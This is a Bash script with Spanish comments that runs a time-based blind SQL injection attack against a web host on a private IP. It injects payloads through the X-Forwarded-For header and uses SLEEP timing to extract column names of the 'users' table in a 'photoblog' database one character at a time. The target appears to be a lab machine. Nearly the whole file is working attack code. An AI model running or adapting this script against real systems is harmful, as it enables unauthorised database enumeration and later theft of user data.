#!/bin/bash
# Script que encuentre los nombres de las columnas de la tabla users
# Procedimiento:
# Recorre cada posible posición y carácter de las columnas en la tabla users.
# Si no se encuentra más nombres de columnas después de un cierto número (column_count), el script se detiene.
# _..::ACTUALIZACION::.._
# Almacena cada columna en el array columns y lo muestra al final

url="http://192.168.44.134"       
expected_delay=1.0                # Retraso esperado (1 segundo simulado con sleep(0.043))
db_name="photoblog"               
table_name="users"                
column_count=10                   # Número máximo de columnas a intentar encontrar
characters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
columns=()                        # Array para almacenar nombres de columnas

echo -e "\nIniciando búsqueda de columnas en la tabla '$table_name'...\n"

# Iterar sobre el número máximo de columnas que esperamos encontrar
for ((col_index=0; col_index < column_count; col_index++)); do
    col_name=""  # Reiniciar el nombre de la columna para cada nueva búsqueda
    position=1   # Empezar desde la primera posición de cada nombre de columna
    echo -e "\n[*] Columna $((col_index + 1)) en la tabla $table_name"

    # Bucle para iterar por cada posición de la letra en el nombre de la columna
    while true; do
        found_char=false

        # Itera sobre cada carácter posible para encontrar el correcto
        for char in $(echo $characters | fold -w1); do
            # Payload que verifica si el carácter en la posición actual coincide
            payload="1' OR IF((SELECT SUBSTRING(column_name,$position,1) FROM information_schema.columns WHERE table_name='$table_name' AND table_schema='$db_name' LIMIT $col_index,1)='$char', SLEEP(0.043), 0) #"

            # Envía la solicitud con el encabezado X-Forwarded-For para inyectar el payload
            start=$(date +%s.%N)
            response=$(curl -s -w "%{time_total}" -o /dev/null -H "X-Forwarded-For: $payload" "$url")
            end=$(date +%s.%N)

            # Calcula el tiempo de respuesta
            duration=$(echo "$end - $start" | bc)

            # Comparación de tiempo de respuesta
            if (( $(echo "$duration > $expected_delay" | bc -l) )); then
                col_name+=$char
                echo -ne "\r[+] Nombre de la columna encontrado: $col_name"
                found_char=true
                break
            fi
        done

        # Si no se encontró un carácter en esta posición, el nombre de la columna está completo
        if [ "$found_char" = false ]; then
            if [ -z "$col_name" ]; then
                echo -e "\n[+] $col_index columnas encontradas en la tabla '$table_name': ${columns[@]}\n"
                exit 0
            else
                columns+=("$col_name")
                break
            fi
        fi

        # Incrementa la posición para la siguiente letra
        position=$((position + 1))
    done
done
